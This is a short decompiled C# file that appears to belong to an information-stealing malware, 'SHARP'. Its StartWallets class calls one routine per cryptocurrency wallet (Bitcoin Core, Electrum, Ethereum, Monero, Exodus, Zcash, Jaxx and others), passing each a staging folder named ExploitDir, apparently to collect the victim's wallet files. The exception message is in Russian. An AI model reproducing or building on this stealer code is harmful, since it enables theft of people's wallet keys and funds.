﻿using System;

namespace SHARP
{
	// Token: 0x0200002C RID: 44
	internal class StartWallets
	{
		// Token: 0x060000ED RID: 237 RVA: 0x00005C74 File Offset: 0x00003E74
		public static void Start()
		{
			string exploitDir = Help.ExploitDir;
			try
			{
				Armory.ArmoryStr(exploitDir);
				AtomicWallet.AtomicStr(exploitDir);
				BitcoinCore.BCStr(exploitDir);
				Bytecoin.BCNcoinStr(exploitDir);
				DashCore.DSHcoinStr(exploitDir);
				Electrum.EleStr(exploitDir);
				Ethereum.EcoinStr(exploitDir);
				LitecoinCore.LitecStr(exploitDir);
				Monero.XMRcoinStr(exploitDir);
				Exodus.ExodusStr(exploitDir);
				Zcash.ZecwalletStr(exploitDir);
				Jaxx.JaxxStr(exploitDir);
			}
			catch (Exception ex)
			{
				Console.WriteLine(((ex != null) ? ex.ToString() : null) + "кошельки :(");
			}
		}
	}
}
